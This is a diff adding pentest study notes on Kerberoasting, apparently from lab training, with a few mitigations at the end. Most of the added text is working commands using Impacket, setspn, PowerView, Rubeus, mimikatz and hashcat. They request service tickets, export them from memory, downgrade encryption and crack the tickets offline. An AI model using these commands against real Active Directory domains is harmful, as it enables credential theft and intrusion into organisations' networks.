@@ -69,3 +69,99 @@ john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 13100 -a 0 -o cracked.txt hashes.kerberoast /usr/share/wordlists/rockyou.txt
 
 ```
+
+
+# Kerberoasting
+- For us to request `TGS-REP` We need to have valid domain user credentials or NTLM hash of a user or even a valid TGT
+- we need to know where is the DC to query it
+## Linux
+- Listing SPNs account:
+```bash
+Impacket-GetUserSPNS -dc-ip 10.10.12.33 domain.com/myuser
+```
+- to request `TGSs` add the `-request` flag to get all or `-request-user <target>`
+- Lastly we can save them into a file
+```bash
+Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+## Windows
+### Manual
+- using windows builtin setspn.exe and focus on `user accounts`
+```powershell
+setspn.exe -Q */*
+```
+- Targeting single user
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+- Get all tickets (Tickets will be loaded but we need to extract them from memory)
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+- Extracting tickets using `mimikatz`
+```powershell
+base64 /out:true   # Important to encode it to print it to stdout instead of saving it to .kirbi
+kerberos::list                #List all Kerberos tickets  
+kerberos::list /export        #Export tickets to .kirbi files
+```
+- formatting the B64 ticket (attacker machine), if we got the .kirbi files  we can skip the first 2 commands down below:
+```bash
+echo "<base64 blob>" | tr -d \\n
+cat encoded_file | base64 -d > sqldev.kirbi
+kirbi2john sqldev.kirbi > sqldev.john
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' sqldev.john > sqldev_tgs_hashcat # hashcat formatting
+```
+
+### Enumerating SPNs using PowerView
+- Getting SPNs
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+- targeting user
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+- Export all tickets to CSV
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+### Rubeus
+- Enumeration
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+- targeting users with `admincount = 1`
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+- We can add `/tgtdeleg` to specify **RC4** encrypted tickets (alg Downgrade), it only works with **Server 2016 or earlier** !!
+## Cracking
+### Encryption types and modes
+there are two main ticket encryptions in Active directory, **RC4** and **AES**, And RC4 is weaker and easier to crack offline
+
+| encryption  | prefix          |
+| ----------- | --------------- |
+| **RC4**     | `$krb5tgs$23$*` |
+| **AES-256** | `$krb5tgs$18$*` |
+| `AES-128`   | `$krb5tgs$17$*` |
+- Checking encryption using PowerView, if it is 0 -> RC4
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+### Hashcat
+- `RC4` encrypted Tickets
+```bash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+- AES-256 tickets
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+## Mitigations
+- Use Managed Service accounts **MSA**/ Group manages Service accounts **gMSA**
+- Use very Strong passwords
+- Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.
+- Then track event IDs `4769` and `4770`
